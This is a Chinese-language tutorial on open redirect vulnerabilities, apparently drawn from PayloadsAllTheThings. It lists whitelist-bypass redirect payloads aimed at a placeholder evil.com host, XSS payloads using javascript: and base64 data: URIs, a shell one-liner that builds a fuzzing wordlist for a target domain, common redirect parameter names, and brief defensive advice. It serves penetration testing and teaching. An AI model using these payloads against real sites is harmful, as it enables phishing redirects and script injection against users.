### 简介

任意重定向(Open Redirection)

### 漏洞原理

如果重定向到`evil.tld`则存在任意重定向漏洞
```
https://famous-website.tld/signup?redirectUrl=https://evil.tld/account
```

使用HTTP响应状态码`3xx`进行重定向

**HTTP Redirection Status Code - 3xx**
- [300 Multiple Choices](https://httpstatuses.com/300)
- [301 Moved Permanently](https://httpstatuses.com/301)
- [302 Found](https://httpstatuses.com/302)
- [303 See Other](https://httpstatuses.com/303)
- [304 Not Modified](https://httpstatuses.com/304)
- [305 Use Proxy](https://httpstatuses.com/305)
- [307 Temporary Redirect](https://httpstatuses.com/307)
- [308 Permanent Redirect](https://httpstatuses.com/308)


### 漏洞影响

* 任意重定向(Open Redirection)漏洞影响
  * 跳转 - 借用合法网站aaa.com的域名，跳转到"钓鱼"等其他网站
  * XSS

### 测试方法

有一定安全意识的开发人员会对"跳转目的值"使用"关键字白名单"进行校验，我们尝试利用这些"关键字白名单"来绕过不够严谨的校验

尝试找到并利用aaa.com的任意重定向漏洞 跳转到evil.com

* 手工测试 - 任意重定向漏洞导致的跳转 - "跳转目的值"
  * 使用特定子域名绕过不严谨的"关键字白名单"校验   `www.aaa.com.evil.com`
  * 使用`@`绕过白名单机制                        `http://www.aaa.com@evil.com/`
  * 使用参数污染 绕过白名单机制                   `?next=whitelisted.com&next=evil.com`
  * 使用子文件夹名 绕过白名单机制                 `http://www.evil.com/http://www.aaa.com/` `http://www.evil.com/folder/www.aaa.com`
  * 使用CRLF绕过对字符串`javascript`的检测和限制  `java%0d%0ascript%0d%0a:alert(0)`
  * 使用`//`绕过对字符串`http`的检测和限制        `//evil.com`
  * 使用`https:`绕过对字符串`//`的检测和限制      `https:evil.com`
  * 使用`\/\/` 绕过对字符串`//`的检测和限制       `\/\/evil.com/` `/\/evil.com/`
  * 使用`。`即%E3%80%82绕过对`.`的检测和限制      `/?redir=evil。com`  `//evil%E3%80%82com`
  * 使用%00绕过黑名单机制                        `//evil%00.com`
  * ...
* 手工测试 - 任意重定向漏洞导致的XSS
  * XSS from Open URL  `";alert(0);//`
  * XSS from `data://` wrapper   `http://www.aaa.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==`
  * XSS from `javascript://` wrapper  `http://www.aaa.com/redirect.php?url=javascript:prompt(1)`
* 自动化 - 生成"跳转目的值"字典 进行fuzz 测试任意重定向漏洞 (跳转+XSS)
  * 进入文件夹`/PayloadsAllTheThings/Open redirect`
  * 执行命令 生成针对aaa.com的"任意重定向漏洞"fuzz字典 `Open-Redirect-payloads-burp-aaa.com.txt`

```
WHITELISTEDDOMAIN="www.aaa.com" && sed 's/www.whitelisteddomain.tld/'"$WHITELISTEDDOMAIN"'/' Open-Redirect-payloads.txt > Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt && echo "$WHITELISTEDDOMAIN" | awk -F. '{print "https://"$0"."$NF}' >> Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt
```


**常见参数**
```
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
```


### SDL - 防御与修复方案

* 如果有非法字符return false
* 严格限制参数值内容-"关键字白名单"
* 严格限制参数值长度
* ...

>参考[PayloadsAllTheThings/Open Redirect/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md)
